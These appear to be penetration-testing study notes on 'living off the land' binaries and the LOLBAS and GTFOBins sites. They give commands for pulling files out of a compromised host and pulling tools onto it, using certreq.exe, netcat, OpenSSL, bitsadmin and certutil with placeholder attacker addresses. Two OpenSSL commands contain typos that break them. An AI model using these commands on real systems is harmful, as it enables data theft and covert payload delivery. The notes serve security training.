
- The Phrase ==Living off the land== was coined by Christopher Campbell & Matt Graeber at DerbyCon 3.
- The term LOLBins (Living off the Lands binaries) came from Twitter. There are two websites that aggregate information on Living off the Land binaries:
	-  [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
	-  [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

-  Living off the Lands binaries can be used to perform  function such as:
	- Download 
	- Upload 
	- Command Execution
	- File Read
	- File Write 
	- Bypasses

- ## Using the LOLBAS and GTFOBINS Project:
	
	- ### LOLBAS:
		- To search for Downloads and upload functions in LOLBAS 
			- search for `/upload` & `/download` keywords.
			
			- ### Upload win.ini 
			
				- For example use ==***CertReq.exe***==
					- Need a listener on a port for a incoming traffic using Netcat and then execute `certreq.exe` to upload file.
				
				- `PowerShell/CMD:` 
					- `certreq.exe -POST -config http://<IP>:<port>/ c:\windows\win.ini`
			
			- ### File Received in Netcat Session:
				- `nc -lvnp <port>`
				- if get an error when running `certreq.exe`, the version that is in used may not contain the `-Post` parameter
	
	- ### GTFOBins:
		- To search for the download and upload function in GTFOBins for Linux binaries.
		- search or select `+file download` or `+file upload`.
		- For example use ***==OpenSSL==***
			- Installed and often included in other software distribution, with sysadmins to generate security certificates, among other tasks.
			- OpenSSL can be used to send files "nc styles".
				- ### Create Certificate:
				
					- `openssl req -newkey rsa:2048 -nodes -keeyout key.pem -x509 -days 365 -out certificate.pem`
				
				- ### Stand Up the Server:

					- `  openssl s_server -quite -accept 80 -cert certificate.pem -key key.pem < <file_path>`
				
				- ### Download File from the Compromised Machine 
				
					- `openssl s_client -connect <IP> -quite > <file_name>`
	
	- ### Other Common Living off the Land tools:
		
		- #### Bitsadmin Download function:
			- The Background Intelligent Transfer Service(BITS):
				- It can be used to download files from HTTP sites and SMB shares.
				- It intelligently checks host and network utilization.
			
			- ##### File Download with Bitsadmin:
			
				- `bitsadmin /transfer wcb /priority foreground http://<IP>:<port>/<file_name> <Destined_file_path>`
				
				- PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers
				
			- ##### Download:
			
				- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:<port>/<file_name>" -Destination "<destine_path-file>"`
	
	- ### Certutil:
		- Certutil can be used to download arbitrary files.
		- It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows
		- The Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
		
			- `certutil.exe -verifyctl -split -f http://<IP>:<port>/<file_name>`
